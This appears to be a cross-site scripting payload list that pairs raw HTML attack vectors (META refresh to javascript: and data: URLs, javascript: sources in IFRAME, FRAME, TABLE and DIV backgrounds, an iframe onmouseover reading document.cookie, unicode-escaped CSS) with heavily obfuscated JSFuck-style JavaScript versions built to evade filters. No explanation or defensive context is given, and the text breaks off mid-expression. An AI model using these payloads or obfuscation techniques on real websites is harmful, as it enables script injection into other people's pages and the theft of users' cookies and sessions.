[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[2]+(true+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+([false]+"")[3]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
¼script¾prompt(¢XSS-109¢)¼/script¾
[]["constructor"]["constructor"]("return String.fromCharCode(188)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(190)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(162)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(162)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(188)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(190)")()
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:prompt(111);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+(true+"")[1]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+(true+"")[1]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+(false+[0]+"")[7]+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[0]+(undefined+"")[1]+(true+"")[0]+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[2]+(+!+[]+!+[]+!+[]+[])[0]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:prompt(115);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+(true+"")[1]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IFRAME SRC="javascript:prompt(117);"></IFRAME>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+([false]+"")[10]+(true+"")[3]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<FRAMESET><FRAME SRC="javascript:prompt(121);"></FRAMESET>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<TABLE BACKGROUND="javascript:prompt(123)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+(false+"")[1]+([][""]+"")[2]+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<TABLE><TD BACKGROUND="javascript:prompt(125)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+(false+"")[1]+([][""]+"")[2]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+([][""]+"")[4]+(false+[0]+"")[7]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<DIV STYLE="background-image: url(javascript:prompt(127))">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[4]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[4]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return 